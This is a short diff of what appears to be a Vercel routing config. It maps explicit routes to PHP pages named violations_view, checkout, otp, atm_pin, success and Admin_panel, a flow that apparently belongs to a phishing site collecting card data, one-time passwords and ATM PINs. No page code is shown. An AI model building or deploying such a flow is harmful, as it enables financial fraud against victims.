@@ -7,17 +7,13 @@
     }
   ],
   "routes": [
-    {
-      "src": "/api/(.*).php",
-      "dest": "/api/$1.php"
-    },
-    {
-      "src": "/loading.php",
-      "dest": "/api/loading.php"
-    },
-    {
-      "src": "/(.*)",
-      "dest": "/api/index.php"
-    }
+    { "src": "/", "dest": "/api/index.php" },
+    { "src": "/loading.php", "dest": "/api/loading.php" },
+    { "src": "/violations_view.php", "dest": "/api/violations_view.php" },
+    { "src": "/checkout.php", "dest": "/api/checkout.php" },
+    { "src": "/otp.php", "dest": "/api/otp.php" },
+    { "src": "/atm_pin.php", "dest": "/api/atm_pin.php" },
+    { "src": "/success.php", "dest": "/api/success.php" },
+    { "src": "/Admin_panel.php", "dest": "/api/Admin_panel.php" }
   ]
 }
